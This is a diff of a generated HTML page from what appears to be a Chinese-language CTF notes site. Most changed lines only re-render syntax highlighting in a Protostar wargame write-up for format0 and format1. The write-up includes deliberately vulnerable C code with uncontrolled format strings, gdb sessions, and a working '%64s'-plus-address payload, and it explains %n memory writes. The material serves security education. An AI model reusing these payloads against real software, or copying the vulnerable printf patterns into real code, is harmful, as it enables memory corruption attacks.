@@ -2179,6 +2179,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -2784,75 +2798,75 @@
 <blockquote>
 <p>This level should be done in less than 10 bytes of input</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">volatile</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
 
-<span class="w">  </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 
 <span class="w">  </span><span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">string</span><span class="p">);</span><span class="w">  </span><span class="c1">// int sprintf(char *str, const char *format, ...);</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have hit the target correctly :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have hit the target correctly :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li>
 <p>首先还是测一下需要覆盖的位置</p>
-<div class="highlight"><pre><span></span><code>$ gdb ./format0
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble vuln
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> vuln:
-0x080483f4 &lt;vuln+0&gt;:    push   ebp
-0x080483f5 &lt;vuln+1&gt;:    mov    ebp,esp
-0x080483f7 &lt;vuln+3&gt;:    sub    esp,0x68
-0x080483fa &lt;vuln+6&gt;:    mov    DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,0x0
-0x08048401 &lt;vuln+13&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
-0x08048404 &lt;vuln+16&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
-0x08048408 &lt;vuln+20&gt;:   lea    eax,<span class="o">[</span>ebp-0x4c<span class="o">]</span>
-0x0804840b &lt;vuln+23&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x0804840e &lt;vuln+26&gt;:   call   0x8048300 &lt;sprintf@plt&gt;
-0x08048413 &lt;vuln+31&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
-0x08048416 &lt;vuln+34&gt;:   cmp    eax,0xdeadbeef
-0x0804841b &lt;vuln+39&gt;:   jne    0x8048429 &lt;vuln+53&gt;
-0x0804841d &lt;vuln+41&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048510
-0x08048424 &lt;vuln+48&gt;:   call   0x8048330 &lt;puts@plt&gt;
-0x08048429 &lt;vuln+53&gt;:   leave  
-0x0804842a &lt;vuln+54&gt;:   ret    
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x0804840e
-<span class="o">(</span>gdb<span class="o">)</span> define hook-stop
-Type commands <span class="k">for</span> definition of <span class="s2">&quot;hook-stop&quot;</span>.
-End with a line saying just <span class="s2">&quot;end&quot;</span>.
-&gt;x/1i <span class="nv">$eip</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>gdb<span class="w"> </span>./format0
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>vuln
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>vuln:
+0x080483f4<span class="w"> </span>&lt;vuln+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x080483f5<span class="w"> </span>&lt;vuln+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x080483f7<span class="w"> </span>&lt;vuln+3&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x68
+0x080483fa<span class="w"> </span>&lt;vuln+6&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp-0xc<span class="o">]</span>,0x0
+0x08048401<span class="w"> </span>&lt;vuln+13&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0x8<span class="o">]</span>
+0x08048404<span class="w"> </span>&lt;vuln+16&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+0x08048408<span class="w"> </span>&lt;vuln+20&gt;:<span class="w">   </span>lea<span class="w">    </span>eax,<span class="o">[</span>ebp-0x4c<span class="o">]</span>
+0x0804840b<span class="w"> </span>&lt;vuln+23&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x0804840e<span class="w"> </span>&lt;vuln+26&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048300<span class="w"> </span>&lt;sprintf@plt&gt;
+0x08048413<span class="w"> </span>&lt;vuln+31&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp-0xc<span class="o">]</span>
+0x08048416<span class="w"> </span>&lt;vuln+34&gt;:<span class="w">   </span>cmp<span class="w">    </span>eax,0xdeadbeef
+0x0804841b<span class="w"> </span>&lt;vuln+39&gt;:<span class="w">   </span>jne<span class="w">    </span>0x8048429<span class="w"> </span>&lt;vuln+53&gt;
+0x0804841d<span class="w"> </span>&lt;vuln+41&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8048510
+0x08048424<span class="w"> </span>&lt;vuln+48&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048330<span class="w"> </span>&lt;puts@plt&gt;
+0x08048429<span class="w"> </span>&lt;vuln+53&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x0804842a<span class="w"> </span>&lt;vuln+54&gt;:<span class="w">   </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x0804840e
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>define<span class="w"> </span>hook-stop
+Type<span class="w"> </span>commands<span class="w"> </span><span class="k">for</span><span class="w"> </span>definition<span class="w"> </span>of<span class="w"> </span><span class="s2">&quot;hook-stop&quot;</span>.
+End<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>line<span class="w"> </span>saying<span class="w"> </span>just<span class="w"> </span><span class="s2">&quot;end&quot;</span>.
+&gt;x/1i<span class="w"> </span><span class="nv">$eip</span>
 &gt;end
-<span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>cat /tmp/test<span class="k">)</span>
-Starting program: /opt/protostar/bin/format0 <span class="k">$(</span>cat /tmp/test<span class="k">)</span>
-0x804840e &lt;vuln+26&gt;:    call   0x8048300 &lt;sprintf@plt&gt;
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>/tmp/test<span class="k">)</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/format0<span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>/tmp/test<span class="k">)</span>
+0x804840e<span class="w"> </span>&lt;vuln+26&gt;:<span class="w">    </span>call<span class="w">   </span>0x8048300<span class="w"> </span>&lt;sprintf@plt&gt;
 
-Breakpoint <span class="m">1</span>, 0x0804840e <span class="k">in</span> vuln <span class="o">(</span>
-    <span class="nv">string</span><span class="o">=</span>0xbffff84b <span class="s2">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ&quot;</span><span class="o">)</span> at format0/format0.c:13
-<span class="m">13</span>  <span class="k">in</span> format0/format0.c
-<span class="o">(</span>gdb<span class="o">)</span> ni
-0x8048413 &lt;vuln+31&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
-<span class="m">15</span>  <span class="k">in</span> format0/format0.c
-<span class="o">(</span>gdb<span class="o">)</span> si
-0x8048416 &lt;vuln+34&gt;:    cmp    eax,0xdeadbeef
-0x08048416  <span class="m">15</span>  <span class="k">in</span> format0/format0.c
-<span class="o">(</span>gdb<span class="o">)</span> info registers 
-eax            0x51515151   <span class="m">1364283729</span>  <span class="c1"># Q</span>
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x0804840e<span class="w"> </span><span class="k">in</span><span class="w"> </span>vuln<span class="w"> </span><span class="o">(</span>
+<span class="w">    </span><span class="nv">string</span><span class="o">=</span>0xbffff84b<span class="w"> </span><span class="s2">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ&quot;</span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span>format0/format0.c:13
+<span class="m">13</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>format0/format0.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>ni
+0x8048413<span class="w"> </span>&lt;vuln+31&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp-0xc<span class="o">]</span>
+<span class="m">15</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>format0/format0.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>si
+0x8048416<span class="w"> </span>&lt;vuln+34&gt;:<span class="w">    </span>cmp<span class="w">    </span>eax,0xdeadbeef
+0x08048416<span class="w">  </span><span class="m">15</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>format0/format0.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers<span class="w"> </span>
+eax<span class="w">            </span>0x51515151<span class="w">   </span><span class="m">1364283729</span><span class="w">  </span><span class="c1"># Q</span>
 ...
 </code></pre></div>
 </li>
@@ -2865,33 +2879,33 @@ eax            0x51515151   <span class="m">1364283729</span>  <span class="c1">
 <span class="n">target</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
 <span class="nb">print</span> <span class="s1">&#39;</span><span class="si">%64s</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">target</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ ./format0 <span class="k">$(</span>python /tmp/format.py<span class="k">)</span>
-you have hit the target correctly :<span class="o">)</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>./format0<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>/tmp/format.py<span class="k">)</span>
+you<span class="w"> </span>have<span class="w"> </span>hit<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>correctly<span class="w"> </span>:<span class="o">)</span>
 </code></pre></div>
 <h2 id="format-1">Format 1<a class="headerlink" href="#format-1" title="Permanent link">&para;</a></h2>
 <blockquote>
 <p>modify arbitrary memory locations</p>
 </blockquote>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
 
-<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have modified the target :)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
-<span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
 </code></pre></div>
 <ul>
 <li><code>printf</code> 与 <code>sprintf</code> 类似，只是根据格式字符串从栈中取参数<ul>
@@ -2907,8 +2921,8 @@ you have hit the target correctly :<span class="o">)</span>
 <li><code>%n</code> 用于将先前已经打印的字符数量存储于指针指向的整型变量</li>
 <li>
 <p>获取变量 <code>target</code> 的地址</p>
-<div class="highlight"><pre><span></span><code>$ objdump -t format1 <span class="p">|</span> grep target
-<span class="m">08049638</span> g     O .bss   <span class="m">00000004</span>              target
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>objdump<span class="w"> </span>-t<span class="w"> </span>format1<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>target
+<span class="m">08049638</span><span class="w"> </span>g<span class="w">     </span>O<span class="w"> </span>.bss<span class="w">   </span><span class="m">00000004</span><span class="w">              </span>target
 </code></pre></div>
 </li>
 <li>
@@ -2916,150 +2930,150 @@ you have hit the target correctly :<span class="o">)</span>
 </li>
 <li>
 <p>不同长度的传参也影响着栈，需要尝试不同的长度使得 ESP 与字符串起始地址的差值为 <span class="arithmatex">\(4\)</span> 的倍数，从而能恰好读到 <code>08049638</code></p>
-<div class="highlight"><pre><span></span><code>$ gdb ./format1
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble main
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-0x0804841c &lt;main+0&gt;:    push   ebp
-0x0804841d &lt;main+1&gt;:    mov    ebp,esp
-0x0804841f &lt;main+3&gt;:    and    esp,0xfffffff0
-0x08048422 &lt;main+6&gt;:    sub    esp,0x10
-0x08048425 &lt;main+9&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-0x08048428 &lt;main+12&gt;:   add    eax,0x4
-0x0804842b &lt;main+15&gt;:   mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-0x0804842d &lt;main+17&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048430 &lt;main+20&gt;:   call   0x80483f4 &lt;vuln&gt;
-0x08048435 &lt;main+25&gt;:   leave  
-0x08048436 &lt;main+26&gt;:   ret    
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x08048430
-Breakpoint <span class="m">1</span> at 0x8048430: file format1/format1.c, line <span class="m">19</span>.
-<span class="o">(</span>gdb<span class="o">)</span> disassemble vuln
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> vuln:
-0x080483f4 &lt;vuln+0&gt;:    push   ebp
-0x080483f5 &lt;vuln+1&gt;:    mov    ebp,esp
-0x080483f7 &lt;vuln+3&gt;:    sub    esp,0x18
-0x080483fa &lt;vuln+6&gt;:    mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
-0x080483fd &lt;vuln+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-0x08048400 &lt;vuln+12&gt;:   call   0x8048320 &lt;printf@plt&gt;
-0x08048405 &lt;vuln+17&gt;:   mov    eax,ds:0x8049638
-0x0804840a &lt;vuln+22&gt;:   <span class="nb">test</span>   eax,eax
-0x0804840c &lt;vuln+24&gt;:   je     0x804841a &lt;vuln+38&gt;
-0x0804840e &lt;vuln+26&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048500
-0x08048415 &lt;vuln+33&gt;:   call   0x8048330 &lt;puts@plt&gt;
-0x0804841a &lt;vuln+38&gt;:   leave  
-0x0804841b &lt;vuln+39&gt;:   ret    
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x08048400
-Breakpoint <span class="m">2</span> at 0x8048400: file format1/format1.c, line <span class="m">10</span>.
-<span class="o">(</span>gdb<span class="o">)</span> define hook-stop
-&gt;x/1i <span class="nv">$eip</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>gdb<span class="w"> </span>./format1
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>main
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>main:
+0x0804841c<span class="w"> </span>&lt;main+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x0804841d<span class="w"> </span>&lt;main+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x0804841f<span class="w"> </span>&lt;main+3&gt;:<span class="w">    </span>and<span class="w">    </span>esp,0xfffffff0
+0x08048422<span class="w"> </span>&lt;main+6&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x10
+0x08048425<span class="w"> </span>&lt;main+9&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0xc<span class="o">]</span>
+0x08048428<span class="w"> </span>&lt;main+12&gt;:<span class="w">   </span>add<span class="w">    </span>eax,0x4
+0x0804842b<span class="w"> </span>&lt;main+15&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>eax<span class="o">]</span>
+0x0804842d<span class="w"> </span>&lt;main+17&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048430<span class="w"> </span>&lt;main+20&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483f4<span class="w"> </span>&lt;vuln&gt;
+0x08048435<span class="w"> </span>&lt;main+25&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x08048436<span class="w"> </span>&lt;main+26&gt;:<span class="w">   </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x08048430
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x8048430:<span class="w"> </span>file<span class="w"> </span>format1/format1.c,<span class="w"> </span>line<span class="w"> </span><span class="m">19</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>vuln
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>vuln:
+0x080483f4<span class="w"> </span>&lt;vuln+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x080483f5<span class="w"> </span>&lt;vuln+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x080483f7<span class="w"> </span>&lt;vuln+3&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x18
+0x080483fa<span class="w"> </span>&lt;vuln+6&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>ebp+0x8<span class="o">]</span>
+0x080483fd<span class="w"> </span>&lt;vuln+9&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x08048400<span class="w"> </span>&lt;vuln+12&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048320<span class="w"> </span>&lt;printf@plt&gt;
+0x08048405<span class="w"> </span>&lt;vuln+17&gt;:<span class="w">   </span>mov<span class="w">    </span>eax,ds:0x8049638
+0x0804840a<span class="w"> </span>&lt;vuln+22&gt;:<span class="w">   </span><span class="nb">test</span><span class="w">   </span>eax,eax
+0x0804840c<span class="w"> </span>&lt;vuln+24&gt;:<span class="w">   </span>je<span class="w">     </span>0x804841a<span class="w"> </span>&lt;vuln+38&gt;
+0x0804840e<span class="w"> </span>&lt;vuln+26&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x8048500
+0x08048415<span class="w"> </span>&lt;vuln+33&gt;:<span class="w">   </span>call<span class="w">   </span>0x8048330<span class="w"> </span>&lt;puts@plt&gt;
+0x0804841a<span class="w"> </span>&lt;vuln+38&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x0804841b<span class="w"> </span>&lt;vuln+39&gt;:<span class="w">   </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x08048400
+Breakpoint<span class="w"> </span><span class="m">2</span><span class="w"> </span>at<span class="w"> </span>0x8048400:<span class="w"> </span>file<span class="w"> </span>format1/format1.c,<span class="w"> </span>line<span class="w"> </span><span class="m">10</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>define<span class="w"> </span>hook-stop
+&gt;x/1i<span class="w"> </span><span class="nv">$eip</span>
 &gt;end
 </code></pre></div>
 <details class="note">
 <summary>'%x' * 10</summary>
-<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x&#39;</span> * <span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
-Starting program: /opt/protostar/bin/format1 <span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x&#39;</span> * <span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
-0x8048430 &lt;main+20&gt;:    call   0x80483f4 &lt;vuln&gt;
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span><span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x&#39;</span><span class="w"> </span>*<span class="w"> </span><span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/format1<span class="w"> </span><span class="s2">&quot;`python -c &quot;</span>print<span class="o">(</span><span class="s1">&#39;%x&#39;</span><span class="w"> </span>*<span class="w"> </span><span class="m">10</span><span class="o">)</span><span class="s2">&quot;`&quot;</span>
+0x8048430<span class="w"> </span>&lt;main+20&gt;:<span class="w">    </span>call<span class="w">   </span>0x80483f4<span class="w"> </span>&lt;vuln&gt;
 
